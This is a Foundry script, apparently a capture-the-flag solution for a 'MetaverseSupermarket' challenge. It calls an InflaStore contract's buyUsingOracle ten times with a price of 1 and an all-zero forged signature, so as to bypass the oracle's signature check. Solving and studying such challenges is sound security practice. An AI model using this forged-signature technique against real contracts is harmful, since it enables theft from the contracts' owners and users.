// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import "../src/02-MetaverseSupermarket.sol";

// forge script script/02-MetaverseSupermarket.s.sol:MetaverseSupermarketScript --fork-url $RPC --private-key $PK
contract MetaverseSupermarketScript is Script {
    InflaStore inflaStore = InflaStore(0xc9672e0DD32237Db0770fcbD3635693583bE4c4f);

    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        inflaStore.infla().approve(address(inflaStore), 10);
        OraclePrice memory oraclePrice = OraclePrice(block.number, 1);
        Signature memory signature = Signature(27, bytes32(0), bytes32(0));
        for (uint256 i = 0; i < 10; i++) {
            inflaStore.buyUsingOracle(oraclePrice, signature);
        }
    }
}
